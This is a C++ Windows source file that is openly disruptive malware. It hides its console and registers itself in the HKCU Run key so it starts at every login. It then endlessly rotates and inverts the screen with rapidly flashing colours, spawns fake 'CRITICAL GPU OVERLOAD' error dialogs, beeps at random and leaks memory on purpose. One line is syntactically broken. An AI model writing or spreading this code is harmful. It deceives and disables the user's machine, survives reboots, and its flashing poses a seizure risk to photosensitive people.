#include <Windows.h>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <ShlObj.h> 

#define MAX_CHAOS_ITERATIONS 0xFFFFFFFF
#define ERROR_POPUP_DELAY_MS 150
#define ROTATION_SPEED 25.0
#define SAFE_FRAME_RATE 60
#define COLOR_CHANGE_RATE 5

HANDLE g_hMutex = CreateMutex(NULL, FALSE, NULL);
const double PI = 3.14159265358979323846;

void InduceInfiniteTurboChaos() {
    HDC hdc = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdc);
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left;
    int h = rect.bottom - rect.top;
    HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(hdcMem, hBitmap);
    double angle = 0.0;
    int frameCounter = 0;
    COLORREF seizureRGB = RGB(255, 0, 0);
    POINT pts[3];
    srand(static_cast<unsigned int>(time(NULL)));

    while (1) {
        WaitForSingleObject(g_hMutex, INFINITE);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        angle += ROTATION_SPEED;
        if (angle >= 360.0) angle = 0;

        pts[0].x = static_cast<LONG>(w * 0.5 * (1 + cos(angle * PI / 180) - sin(angle * PI / 180) * h * 0.5));
        pts[0].y = static_cast<LONG>(w * 0.5 * sin(angle * PI / 180) + h * 0.5 * (1 + cos(angle * PI / 180)));
        pts[1].x = static_cast<LONG>(w * 0.5 * (1 - cos(angle * PI / 180) - sin(angle * PI / 180) * h * 0.5));
                pts[1].y = static_cast<LONG>(w * 0.5 * sin(angle * PI / 180) + h * 0.5 * (1 - cos(angle * PI / 180)));
        pts[2].x = static_cast<LONG>(w * 0.5 * (1 - cos(angle * PI / 180) + sin(angle * PI / 180) * h * 0.5); 
        pts[2].y = static_cast<LONG>(-w * 0.5 * sin(angle * PI / 180) + h * 0.5 * (1 - cos(angle * PI / 180)));

        PlgBlt(hdc, pts, hdcMem, 0, 0, w, h, NULL, 0, 0);

        if (frameCounter % COLOR_CHANGE_RATE == 0) {
            HBRUSH brush = CreateSolidBrush(seizureRGB);
            SelectObject(hdc, brush);
            PatBlt(hdc, rand() % w / 2, rand() % h / 2, w - rand() % w / 2, h - rand() % h / 2, PATINVERT);
            DeleteObject(brush);
            seizureRGB = RGB(GetBValue(seizureRGB), GetRValue(seizureRGB), GetGValue(seizureRGB));
        }

        if (frameCounter % 30 == 0) {
            CreateThread(NULL, 0, [](LPVOID) -> DWORD {
                MessageBoxA(NULL, "CRITICAL GPU OVERLOAD", "ERROR 0xDEADBEEF", MB_ICONERROR | MB_SYSTEMMODAL);
                return 0;
            }, NULL, 0, NULL);
            
            for (int i = 0; i < 15; i++) {
                MoveToEx(hdc, rand() % w, rand() % h, NULL);
                LineTo(hdc, rand() % w, rand() % h);
            }
        }

        if (frameCounter % 100 == 0) {
            HBITMAP hLeak = CreateCompatibleBitmap(hdc, w, h); 
        }

        ReleaseMutex(g_hMutex);
        frameCounter++;
        Sleep(1000 / SAFE_FRAME_RATE);
    }
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI ChaosRotationThread(LPVOID lpParam) {
    InduceInfiniteTurboChaos();
    return 0;
}

void AddToStartup() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        RegSetValueExA(hKey, "ChaosEngine", 0, REG_SZ, 
                      (const BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                  LPSTR lpCmdLine, int nCmdShow) {
    FreeConsole();
    
    AddToStartup();

    CreateThread(NULL, 0, ChaosRotationThread, NULL, 0, NULL);
    
    CreateThread(NULL, 0, [](LPVOID) -> DWORD {
        while (true) {
            Sleep(5000);
            Beep(rand() % 2000 + 500, 300);
        }
        return 0;
    }, NULL, 0, NULL);

    while (true) {
        Sleep(1000);
    }
    
    return 0;
}
